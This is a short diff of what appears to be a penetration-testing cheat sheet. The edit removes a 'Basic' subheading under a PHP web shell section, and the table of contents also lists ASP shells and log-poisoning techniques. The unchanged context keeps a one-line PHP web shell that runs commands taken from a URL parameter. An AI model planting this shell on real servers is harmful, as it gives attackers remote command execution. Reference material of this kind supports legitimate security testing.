@@ -9,7 +9,6 @@
 - [WebShell](#WebShell)
   * [ASP WebShell](#ASP-WebShell)
   * [PHP WebShell](#PHP-WebShell)
-    * [Basic](#Basic)
   * [Log Poisoning WebShell](#Log-Poisoning-WebShell)
       * [SSH](#Log-Poisoning-SSH)
       * [HTTP](#Log-Poisoning-HTTP)
@@ -117,8 +116,6 @@
   ```
   
   ### PHP WebShell
-  
-  ### Basic
 
   ```php
   <?php system($_GET['cmd']); ?>
